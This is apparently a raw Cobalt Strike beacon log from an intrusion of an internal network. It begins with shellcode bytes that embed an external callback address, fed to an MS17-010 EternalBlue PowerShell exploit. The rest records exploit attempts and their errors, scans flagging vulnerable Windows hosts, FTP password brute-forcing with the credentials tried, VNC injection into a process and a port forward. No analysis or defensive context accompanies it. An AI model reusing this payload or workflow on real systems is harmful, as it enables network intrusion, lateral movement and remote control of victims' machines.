0xff, 0xd5, 0x48, 0x93, 0x53, 0x53, 0x48, 0x89, 0xe7, 0x48, 0x89, 0xf1, 0x48, 0x89, 0xda, 0x41, 0xb8, 0x00, 0x20, 0x00, 0x00, 0x49, 0x89, 0xf9, 0x41, 0xba, 0x12, 0x96, 0x89, 0xe2, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x20, 0x85, 0xc0, 0x74, 0xb6, 0x66, 0x8b, 0x07, 0x48, 0x01, 0xc3, 0x85, 0xc0, 0x75, 0xd7, 0x58, 0x58, 0x58, 0x48, 0x05, 0x00, 0x00, 0x00, 0x00, 0x50, 0xc3, 0xe8, 0x9f, 0xfd, 0xff, 0xff, 0x34, 0x37, 0x2e, 0x31, 0x30, 0x39, 0x2e, 0x34, 0x39, 0x2e, 0x32, 0x32, 0x39, 0x00, 0x05, 0xf5, 0xe1, 0x00) -InitialGrooms 12 -MaxAttempts 5 (unmanaged)
+12/08 12:32:27 UTC [checkin] host called home, sent: 8182 bytes
+12/08 12:32:27 UTC [checkin] host called home, sent: 134767 bytes
+12/08 12:32:30 UTC [output]
+received output:
+VERBOSE: Connecting to target for activities
+VERBOSE: Connection established for exploitation.
+VERBOSE: all but last fragment of exploit packet
+VERBOSE: Running final exploit packet
+
+
+12/08 12:32:31 UTC [output]
+received output:
+VERBOSE: SMB code: 00-00
+VERBOSE: Send the payload with the grooms
+
+
+12/08 12:32:34 UTC [output]
+received output:
+VERBOSE: Connecting to target for activities
+VERBOSE: Connection established for exploitation.
+VERBOSE: all but last fragment of exploit packet
+VERBOSE: Running final exploit packet
+VERBOSE: SMB code: 00-00
+VERBOSE: Send the payload with the grooms
+
+
+12/08 12:32:39 UTC [output]
+received output:
+VERBOSE: Connecting to target for activities
+VERBOSE: Connection established for exploitation.
+VERBOSE: all but last fragment of exploit packet
+VERBOSE: Running final exploit packet
+VERBOSE: SMB code: 00-00
+VERBOSE: Send the payload with the grooms
+
+
+12/08 12:32:44 UTC [output]
+received output:
+VERBOSE: Connecting to target for activities
+
+
+12/08 12:32:56 UTC [output]
+received output:
+172.17.102.2 VTP  [Win 6.1]
+172.17.102.8 VTP  [Win 6.1]
+
+
+12/08 12:33:06 UTC [output]
+received output:
+ERROR: New-Object : 使用“2”个参数调用“.ctor”时发生异常:“由于连接方在一段时间后没有正确答复或连接的主机没有反应，连接尝试失败。 172.17.110.208:445”
+ERROR: 所在位置 行:558 字符: 25
+ERROR: +     $client = New-Object <<<<  System.Net.Sockets.TcpClient($Target,445)
+ERROR:     + CategoryInfo          : InvalidOperation: (:) [New-Object], MethodInvocationException
+ERROR:     + FullyQualifiedErrorId : ConstructorInvokedThrowException,Microsoft.PowerShell.Commands.NewOb 
+ERROR:    jectCommand
+ERROR:  
+ERROR: 不能对值为空的表达式调用方法。
+ERROR: 所在位置 行:534 字符: 15
+ERROR: +     $sock.Send <<<< ($raw_proto) | out-null
+ERROR:     + CategoryInfo          : InvalidOperation: (Send:String) [], RuntimeException
+ERROR:     + FullyQualifiedErrorId : InvokeMethodOnNull
+ERROR:  
+VERBOSE: socket error, exploit may fail 
+ERROR: 不能对值为空的表达式调用方法。
+ERROR: 所在位置 行:541 字符: 15
+ERROR: +     $sock.Send <<<< ($raw_proto) | out-null
+ERROR:     + CategoryInfo          : InvalidOperation: (Send:String) [], RuntimeException
+ERROR:     + FullyQualifiedErrorId : InvokeMethodOnNull
+ERROR:  
+VERBOSE: socket error, exploit may fail 
+ERROR: 不能对值为空的表达式调用方法。
+ERROR: 所在位置 行:549 字符: 15
+ERROR: +     $sock.Send <<<< ($raw_proto) | out-null
+ERROR:     + CategoryInfo          : InvalidOperation: (Send:String) [], RuntimeException
+ERROR:     + FullyQualifiedErrorId : InvokeMethodOnNull
+ERROR:  
+VERBOSE: socket error, exploit may fail 
+ERROR: 在此对象上找不到属性“ReceiveTimeout”；请确保该属性存在且可设置。
+ERROR: 所在位置 行:649 字符: 12
+ERROR: +      $sock. <<<< ReceiveTimeout =2000
+ERROR:     + CategoryInfo          : InvalidOperation: (ReceiveTimeout:String) [], RuntimeException
+ERROR:     + FullyQualifiedErrorId : PropertyNotFound
+ERROR:  
+VERBOSE: Connection established for exploitation.
+VERBOSE: all but last fragment of exploit packet
+ERROR: 不能对值为空的表达式调用方法。
+ERROR: 所在位置 行:581 字符: 15
+ERROR: +     $sock.Send <<<< ($nt_trans_pkt) | out-null
+ERROR:     + CategoryInfo          : InvalidOperation: (Send:String) [], RuntimeException
+ERROR:     + FullyQualifiedErrorId : InvokeMethodOnNull
+ERROR:  
+VERBOSE: socket error, exploit may fail 
+ERROR: 不能对值为空的表达式调用方法。
+ERROR: 所在位置 行:595 字符: 15
+ERROR: +     $sock.Send <<<< ($trans2_pkt_nulled) | out-null
+ERROR:     + CategoryInfo          : InvalidOperation: (Send:String) [], RuntimeException
+ERROR:     + FullyQualifiedErrorId : InvokeMethodOnNull
+ERROR:  
+VERBOSE: socket error, exploit may fail 
+
+
+12/08 12:33:09 UTC [output]
+received output:
+VERBOSE: Running final exploit packet
+VERBOSE: socket error, exploit may fail horribly
+VERBOSE: Send the payload with the grooms
+
+
+12/08 12:33:15 UTC [output]
+received output:
+宸插畬鎴� 513/514 [-] ftp://172.17.110.253:21 admin Aa123456789 530 Login or password incorrect!
+
+
+12/08 12:33:15 UTC [output]
+received output:
+ERROR: 不能对值为空的表达式调用方法。
+ERROR: 所在位置 行:699 字符: 17
+ERROR: +      $sock.Close <<<< ()| out-null
+ERROR:     + CategoryInfo          : InvalidOperation: (Close:String) [], RuntimeException
+ERROR:     + FullyQualifiedErrorId : InvokeMethodOnNull
+ERROR:  
+VERBOSE: Connecting to target for activities
+VERBOSE: Connection established for exploitation.
+VERBOSE: all but last fragment of exploit packet
+
+
+12/08 12:33:16 UTC [output]
+received output:
+VERBOSE: Running final exploit packet
+VERBOSE: SMB code: 00-00
+VERBOSE: Send the payload with the grooms
+
+
+12/08 12:33:50 UTC [output]
+received output:
+172.17.102.181 WIN10-0011
+
+
+12/08 12:34:27 UTC [output]
+received output:
+宸插畬鎴� 513/514 [-] ftp://172.17.110.253:21 www pass123 530 Login or password incorrect!
+
+
+12/08 12:34:36 UTC [output]
+received output:
+172.17.103.214 USER  [Win 6.1]
+
+
+12/08 12:35:21 UTC [output]
+received output:
+172.17.104.14 WIN-A694SCMAFA1  [Win 2008 R2 Standard 7601 SP 1]
+172.17.104.52 MS17-010 WIN-7F7M8GHRP5F  [Win 2016 Datacenter 14393]
+
+
+12/08 12:35:27 UTC [output]
+received output:
+宸插畬鎴� 514/514
+[*] 鎵弿缁撴潫,鑰楁椂: 31m18.0584188s
+
+12/08 12:36:52 UTC [output]
+received output:
+172.17.104.182 DESKTOP-A9CKCS4
+
+
+12/08 12:37:37 UTC [output]
+received output:
+172.17.105.44 USER  [Win 6.1]
+172.17.105.50 USER  [Win 6.1]
+
+
+12/08 12:37:37 UTC [output]
+received output:
+172.17.105.133 USER  [Win 6.1]
+
+
+12/08 12:37:37 UTC [output]
+received output:
+172.17.105.129 USER  [Win 6.1]
+172.17.105.135 USER  [Win 6.1]
+
+
+12/08 12:38:22 UTC [output]
+received output:
+172.17.106.54 USER  [Win 6.1]
+
+
+12/08 12:40:38 UTC [output]
+received output:
+172.17.107.97 USER  [Win 6.1]
+
+
+12/08 12:41:09 UTC [input] <dog> desktop
+12/08 12:41:09 UTC [task] <T1106> Tasked beacon to Desktop inject 15044 :dogCs edit.
+12/08 12:41:09 UTC [checkin] host called home, sent: 16 bytes
+12/08 12:41:10 UTC [task] <> Tasked beacon to inject VNC server into 15044/x86
+12/08 12:41:10 UTC [checkin] host called home, sent: 287762 bytes
+12/08 12:41:10 UTC [output]
+started port forward on 7945 to 127.0.0.1:7945
+
+12/08 12:42:08 UTC [output]
+received output:
+172.17.108.39 USER  [Win 6.1]
+
+
+12/08 12:42:53 UTC [output]
+received output:
+172.17.108.107 USER  [Win 6.1]
+172.17.108.82 BF-202304071604  [Win 10 Pro 19045]
+172.17.108.138 USER  [Win 6.1]
+
+
+12/08 12:43:04 UTC [output]
+received output:
+172.17.108.203 User-2020UHYGCK  [Win 7 Ultimate 7601 SP 1]
+172.17.108.249 USER  [Win 6.1]
+
+
+12/08 12:46:16 UTC [output]
+received output:
+172.17.110.208 MS17-010 1-PC  [Win 7 Professional 7601 SP 1]
+
+
+12/08 12:46:28 UTC [output]
+received output:
+172.17.110.253 WIN-5RCFU5VD4RU  [Win 2012 R2 Standard 9600]
+
+
